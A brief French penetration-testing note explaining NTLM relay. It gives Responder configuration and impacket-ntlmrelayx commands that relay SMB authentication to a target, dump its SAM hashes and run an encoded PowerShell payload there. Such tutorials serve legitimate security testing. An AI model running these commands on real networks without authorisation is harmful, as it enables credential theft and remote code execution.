---
public: true # set to true to make the article publishable
---

Il est parfois possible de relayer une demande d'authentification lorsqu'on arrive pas à casser un mot de passe.

```
# On désactive d'abord SMB dans la configuration du responder 

cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

```
# On lance ensuite impacket :
impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET_IP

## Lorsqu'on recoit une connexion SMB, elle est relayée vers $TARGET_IP
## Par défaut un dump de la SAM est réalisé

## On peut également exécuter une commande :
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <B64_PAYLOAD>'
```
